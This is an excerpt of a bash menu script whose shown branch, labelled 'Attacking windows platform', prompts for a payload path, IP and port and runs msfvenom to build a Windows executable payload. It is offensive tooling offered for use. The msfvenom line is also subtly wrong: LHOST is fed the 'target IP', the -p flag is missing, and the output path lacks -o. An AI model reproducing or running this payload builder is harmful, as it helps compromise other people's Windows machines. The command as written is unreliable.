...
case $choice in
    ...
    case $choice7 in
        "a"|"A")
		echo "Attacking windows platform"
		echo "" 
		echo "What is the paylod path"
		read payloadpath
		echo ""
		echo "What is the target IP?"
		read targetIP
		echo ""
		echo "What is the target port?"
		echo ""
		read targetport
		sudo msfvenom -a x86 $payloadpath LHOST=$targetIP LPORT=$targetport -f exe /home/$USER/Desktop                                                 ## Insert option
        ;;
